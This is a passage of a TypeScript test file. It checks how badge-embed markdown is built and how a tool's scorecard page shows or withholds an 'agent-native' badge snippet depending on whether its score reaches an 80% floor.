  test('emits standard agent-native markdown link wrapping the SVG', () => {
    const md = buildEmbedMarkdown('rg');
    expect(md).toBe('[![agent-native](https://anc.dev/badge/rg.svg)](https://anc.dev/score/rg)');
  });

  test('honors PUBLIC_BASE_URL via resolveBaseUrl (explicit override)', () => {
    const md = buildEmbedMarkdown('rg', 'https://staging.example.com');
    expect(md).toBe(
      '[![agent-native](https://staging.example.com/badge/rg.svg)](https://staging.example.com/score/rg)',
    );
  });
});

describe('buildScorecardBody — embed-snippet gating', () => {
  function tool(name = 'rg') {
    return {
      name,
      binary: name,
      description: 'fast grep',
      tier: 'workhorse',
      language: 'rust',
      creator: 'BurntSushi',
      install: `brew install ${name}`,
      repo: `BurntSushi/${name}`,
    };
  }

  function sc(passes: number, fails: number) {
    const results: any[] = [];
    for (let i = 0; i < passes; i++) {
      results.push({
        id: `p${i}`,
        label: `pass${i}`,
        group: 'P1',
        layer: 'behavioral',
        status: 'pass',
        evidence: null,
      });
    }
    for (let i = 0; i < fails; i++) {
      results.push({
        id: `f${i}`,
        label: `fail${i}`,
        group: 'P2',
        layer: 'behavioral',
        status: 'fail',
        evidence: 'no flag',
      });
    }
    return {
      schema_version: '1.3',
      summary: { total: passes + fails, pass: passes, warn: 0, fail: fails, skip: 0, error: 0 },
      results,
    };
  }

  test('eligible (score=1.0) renders copy-paste snippet + SVG preview', () => {
    const html = buildScorecardBody(tool('rg'), sc(10, 0), [], { met: 7, total: 7, details: [] }, 1.0);
    expect(html).toContain('scorecard-embed--eligible');
    expect(html).not.toContain('scorecard-embed--below');
    expect(html).toContain('badge/rg.svg');
    expect(html).toContain('clears the <a href="/badge">badge floor</a>');
    // Live preview img so the copyable shape and what it actually looks like sit side-by-side.
    expect(html).toContain('<img src="/badge/rg.svg"');
    expect(html).toContain('alt="agent-native badge for rg"');
  });

  test('eligible at exactly the floor (score=0.80) — brightline check, >= not >', () => {
    const html = buildScorecardBody(tool('rg'), sc(8, 2), [], { met: 5, total: 7, details: [] }, 0.8);
    expect(html).toContain('scorecard-embed--eligible');
    expect(html).not.toContain('scorecard-embed--below');
  });

  test('one point below the floor (score=0.79) renders the below-floor hint', () => {
    const sc79 = sc(79, 21);
    const issues = [{ id: 'f0', label: 'fail0', group: 'P2', status: 'fail', evidence: 'no flag' }];
    const html = buildScorecardBody(tool('rg'), sc79, issues, { met: 4, total: 7, details: [] }, 0.79);
    expect(html).toContain('scorecard-embed--below');
    expect(html).not.toContain('scorecard-embed--eligible');
    expect(html).not.toContain('<img src="/badge/rg.svg"'); // no preview image below the floor
    expect(html).toContain('1 point below'); // singular for a 1-point gap (80 - 79 = 1)
    expect(html).toContain('top issues above are the place to start'); // points at existing issues section
  });

  test('below-floor with no top issues references the full check list instead', () => {
    const html = buildScorecardBody(tool('rg'), sc(7, 3), [], { met: 4, total: 7, details: [] }, 0.7);
    expect(html).toContain('See the full check results below for the gaps.');
    expect(html).not.toContain('top issues above are the place to start');
  });

  test('below-floor gap math: 65% scorecard is 15 points below the 80% floor (plural)', () => {
    const html = buildScorecardBody(tool('rg'), sc(65, 35), [], { met: 3, total: 7, details: [] }, 0.65);
    expect(html).toContain('15 points below');
  });
});
